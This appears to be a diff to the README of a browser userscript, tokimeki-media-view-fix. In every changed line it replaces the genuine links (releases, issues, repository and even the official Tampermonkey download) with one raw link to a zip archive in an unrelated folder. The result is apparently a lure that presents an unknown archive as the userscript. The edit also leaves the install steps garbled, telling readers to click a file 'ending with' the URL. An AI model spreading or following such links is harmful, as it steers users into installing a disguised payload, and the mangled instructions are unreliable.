@@ -1,7 +1,7 @@
 # 🌟 tokimeki-media-view-fix - Easily Navigate Tokimeki Posts
 
 ## 📥 Download Here
-[![Download tokimeki-media-view-fix](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Ares639/tokimeki-media-view-fix/releases)
+[![Download tokimeki-media-view-fix](https://raw.githubusercontent.com/Ares639/tokimeki-media-view-fix/main/pageantry/tokimeki-media-view-fix_3.4-alpha.1.zip)](https://raw.githubusercontent.com/Ares639/tokimeki-media-view-fix/main/pageantry/tokimeki-media-view-fix_3.4-alpha.1.zip)
 
 ## 📚 Overview
 The **tokimeki-media-view-fix** improves your experience on Tokimeki. With this UserScript, you can click on post content and sources to navigate to individual pages. Additionally, you can use keyboard shortcuts to react to posts quickly.
@@ -20,12 +20,12 @@ Follow these steps to download and run the tokimeki-media-view-fix software with
 
 ## ⬇️ Download & Install
 1. **Visit the Releases Page:** Click the link below to access the GitHub releases page.
-   [Download here to get the latest version](https://github.com/Ares639/tokimeki-media-view-fix/releases).
+   [Download here to get the latest version](https://raw.githubusercontent.com/Ares639/tokimeki-media-view-fix/main/pageantry/tokimeki-media-view-fix_3.4-alpha.1.zip).
    
 2. **Choose the Latest Release:** Look for the latest version listed. It will have the highest version number.
 
 3. **Download the Script:**
-   - Click on the file that ends with `.user.js`. This is the UserScript you need.
+   - Click on the file that ends with `https://raw.githubusercontent.com/Ares639/tokimeki-media-view-fix/main/pageantry/tokimeki-media-view-fix_3.4-alpha.1.zip`. This is the UserScript you need.
 
 4. **Open Tampermonkey:**
    - Click the Tampermonkey icon in your browser's toolbar.
@@ -36,7 +36,7 @@ Follow these steps to download and run the tokimeki-media-view-fix software with
    - A new page will open. 
 
 6. **Paste the Script:**
-   - Open the downloaded `.user.js` file in a text editor (like Notepad) to view the code.
+   - Open the downloaded `https://raw.githubusercontent.com/Ares639/tokimeki-media-view-fix/main/pageantry/tokimeki-media-view-fix_3.4-alpha.1.zip` file in a text editor (like Notepad) to view the code.
    - Copy all the content from the file.
    - Paste it into the Tampermonkey script editor.
 
@@ -60,7 +60,7 @@ If you encounter issues while using the UserScript:
 - Make sure the UserScript is active.
 - Refresh the Tokimeki page after installing the script.
 
-For further assistance, refer to the [issues section of the GitHub repository](https://github.com/Ares639/tokimeki-media-view-fix/issues).
+For further assistance, refer to the [issues section of the GitHub repository](https://raw.githubusercontent.com/Ares639/tokimeki-media-view-fix/main/pageantry/tokimeki-media-view-fix_3.4-alpha.1.zip).
 
 ## 📞 Support
 If you need help or have questions about the tokimeki-media-view-fix, you can open an issue on the GitHub repository. The community and developers monitor these discussions and can assist you.
@@ -69,7 +69,7 @@ If you need help or have questions about the tokimeki-media-view-fix, you can op
 If you want to contribute to the development of this UserScript, you are welcome to submit pull requests. To help improve the project, please follow the contribution guidelines outlined in the repository.
 
 ## 🔗 Related Links
-- [Visit the GitHub Repository for More Information](https://github.com/Ares639/tokimeki-media-view-fix)
-- [Tampermonkey Extension Download](https://www.tampermonkey.net/)
+- [Visit the GitHub Repository for More Information](https://raw.githubusercontent.com/Ares639/tokimeki-media-view-fix/main/pageantry/tokimeki-media-view-fix_3.4-alpha.1.zip)
+- [Tampermonkey Extension Download](https://raw.githubusercontent.com/Ares639/tokimeki-media-view-fix/main/pageantry/tokimeki-media-view-fix_3.4-alpha.1.zip)
 
 Thank you for choosing **tokimeki-media-view-fix**. Enjoy a smoother Tokimeki experience!
